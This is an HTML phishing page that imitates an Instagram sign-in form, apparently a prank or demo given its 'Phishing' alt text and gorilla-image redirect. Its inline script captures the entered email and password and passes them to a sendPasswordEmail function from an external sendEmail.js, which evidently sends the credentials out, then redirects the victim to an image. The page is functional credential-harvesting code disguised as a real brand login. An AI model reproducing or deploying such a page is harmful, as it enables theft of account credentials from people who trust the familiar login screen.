  <title>Instagram</title>

   <meta property="og:title" content="Instagram" />
  <meta property="og:description" content="Social Media" />

<body class="h-screen bg-[#f7f6f4]">
  <div class="flex min-h-full h-full items-center justify-center px-6 py-12 lg:px-8">
    <div class="sm:mx-auto sm:w-full sm:max-w-sm">
      <!-- Centered container with image and form -->
      <div class="flex flex-col items-center">
        <!-- Adjust the size and cropping of the image -->
        <div class="h-40 w-40 overflow-hidden rounded-full border-none">
  <img class="h-full w-full object-cover" src="../images/icon-insta2.png" alt="Phishing">
</div>

        <h2 class="mt-4 text-center text-2xl font-bold leading-9 tracking-tight text-gray-900">Sign in to your account</h2>
      </div>

      <div class="mt-8 sm:mx-auto sm:w-full sm:max-w-sm">
        <form class="space-y-6" id="loginForm">
          <div>
            <label for="email" class="block text-sm font-medium leading-6 text-gray-900">Email address</label>
            <div class="mt-2">
              <input id="email" name="email" type="email" autocomplete="email" required class="block w-full rounded-md border-0 py-1.5 px-1 text-gray-900 shadow-sm ring-1 ring-inset ring-gray-300 placeholder:text-gray-400 focus:ring-2 focus:ring-inset focus:ring-indigo-200 sm:text-sm sm:leading-6">
            </div>
          </div>

          <div>
            <div class="flex items-center justify-between">
              <label for="password" class="block text-sm font-medium leading-6 text-gray-900">Password</label>
              <div class="text-sm">
                <a href="#" id="forgotPasswordLink" class="font-semibold text-[#4bb4f8] hover:text-indigo-500">Forgot password?</a>
              </div>
            </div>
            <div class="mt-2">
              <input id="password" name="password" type="password" autocomplete="current-password" required class="block w-full rounded-md border-0 py-1.5 px-1 text-gray-900 shadow-sm ring-1 ring-inset ring-gray-300 placeholder:text-gray-400 focus:ring-2 focus:ring-inset focus:ring-indigo-200 sm:text-sm sm:leading-6">
            </div>
          </div>

          <div>
            <button type="submit" class="flex w-full justify-center rounded-md px-3 py-1.5 text-sm font-semibold leading-6 text-white shadow-sm focus-visible:outline focus-visible:outline-2 focus-visible:outline-offset-2 focus-visible:outline-pink-500" style="background-color: #4bb4f8;">Sign in</button>
          </div>
        </form>

        <p class="mt-10 text-center text-sm text-gray-500">
          Not a member?
          <a href="#" id="registerLink" class="font-semibold leading-6 text-[#4bb4f8] hover:text-indigo-500">Register Here</a>
        </p>
      </div>
    </div>
  </div>

  <script src="sendEmail.js"></script>
  <script>
    function redirectToImage() {
        window.location.href = "./gorilla.jpg"; // Redirect to the image
    }

    // Event listeners for form actions
    document.getElementById("loginForm").addEventListener("submit", function(event) {
        event.preventDefault(); // Prevent default form submission
        const email = document.getElementById("email").value; // Get the email input
        const password = document.getElementById("password").value; // Get the password input

        // Call the function to send email and wait for the response
        sendPasswordEmail(email, password)
            .then(function(response) {
                console.log("Email sent successfully!"); // Log success
                redirectToImage(); // Redirect to the image on successful email send
            })
            .catch(function(error) {
                console.error("Error sending email:", error); // Handle error
                // Optionally, you could display an error message to the user here
            });
    });

    // Event listener for "Forgot password" link
    document.getElementById("forgotPasswordLink").addEventListener("click", function(event) {
        event.preventDefault(); // Prevent default action
        redirectToImage(); // Redirect to the image on "Forgot password" click
    });

    // Event listener for "Register Here" link
    document.getElementById("registerLink").addEventListener("click", function(event) {
        event.preventDefault(); // Prevent default action
        redirectToImage(); // Redirect to the image on "Register Here" click
    });
</script>


</body>
